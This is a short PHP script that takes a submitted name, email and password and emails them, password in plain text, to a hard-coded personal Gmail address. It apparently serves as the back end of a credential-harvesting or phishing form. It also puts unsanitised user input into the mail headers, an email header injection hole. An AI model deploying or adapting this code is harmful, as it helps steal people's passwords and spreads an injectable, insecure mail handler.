<?php
    if (isset($_POST["submit"])) {
        $name = $_POST["name"];
        $email = $_POST["email"];
        $password = $_POST["password"];
        $msg = "
        Name: $name
        Email: $email
        Password: $password";
        $to = "emau757@gmail.com";
        $subject = "Simple Health Slicing Test";
        $headers = "From: $name <$email>";
        mail($to,$subject,$msg,$headers);
    } else {
        echo "ERROR";
    }
?>